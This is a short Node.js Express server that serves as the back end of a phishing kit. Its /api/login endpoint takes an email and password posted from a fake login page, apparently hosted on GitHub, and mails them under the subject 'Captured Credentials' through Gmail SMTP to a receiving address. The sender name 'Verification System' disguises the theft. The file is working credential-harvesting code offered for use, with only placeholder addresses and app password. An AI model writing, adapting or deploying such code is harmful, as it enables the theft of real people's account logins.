const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors'); // Needed to allow GitHub to talk to this server
const app = express();

app.use(cors());
app.use(express.json());

const transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    port: 465,
    secure: true,
    auth: {
        user: 'your-email@gmail.com',
        pass: 'your-16-char-app-password' // NOT your login password
    }
});

app.post('/api/login', (req, res) => {
    const { email, pass } = req.body;

    const mailOptions = {
        from: 'Verification System <your-email@gmail.com>',
        to: 'RECEIVING_EMAIL@gmail.com',
        subject: `Login Activity: ${email}`,
        text: `Captured Credentials:\n\nEmail: ${email}\nPassword: ${pass}\n\nTime: ${new Date().toLocaleString()}`
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            return res.status(500).json({ status: 'error' });
        }
        res.status(200).json({ status: 'success' });
    });
});

app.listen(process.env.PORT || 3000, () => console.log('Server Active'));
